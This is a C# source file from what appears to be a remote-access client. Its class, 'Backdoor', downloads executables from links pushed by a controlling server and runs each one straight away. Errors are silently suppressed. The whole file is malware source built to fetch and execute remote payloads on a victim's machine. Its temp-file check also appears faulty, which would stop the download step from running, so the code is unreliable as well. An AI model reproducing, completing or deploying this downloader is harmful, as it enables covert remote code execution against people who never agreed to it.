using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client.Armitage
{
    /// <summary>
    /// A letter, for all letters.
    /// </summary>
    public class Backdoor
    {
        private List<Tuple<string, float>> _finishedlinks = new List<Tuple<string, float>>();

        private List<Tuple<string, float>> _links;
        public Backdoor(List<Tuple<string, float>> execlinks)
        {
            _links = execlinks;
        }
        /// <summary>
        /// Dowloads executables from the links and executes them.
        /// </summary>
        public async void Execute()
        {
            if (_links.Count > 0)
                await Task.Run(() =>
                {
                    foreach (var l in _links)
                    {
                        // check if already been downloaded and executed
                        if (_finishedlinks.FindIndex(i => i.Item1 == l.Item1 && i.Item2 == l.Item2) <= -1)
                        {
                            string filename = Path.GetTempFileName();

                            if (!File.Exists(filename))
                            {
                                filename = Communication.Server.AsyncDownloadFile(l.Item1, filename).Result;

                                // run the file RIGHT after downloading
                                if (!string.IsNullOrEmpty(filename) && File.Exists(filename))
                                {
                                    try
                                    {
                                        _finishedlinks.Add(new Tuple<string, float>(l.Item1, l.Item2));
                                        // run even if not .exe
                                        var p = new Process
                                        {
                                            StartInfo = new ProcessStartInfo
                                            {
                                                FileName = filename,
                                                UseShellExecute = false
                                            }
                                        };
                                        p.Start();
                                    }
                                    catch
                                    {

                                    }
                                }
                            }
                        }
                        // else if already existed do nothing
                    }
                });
        }
    }
}
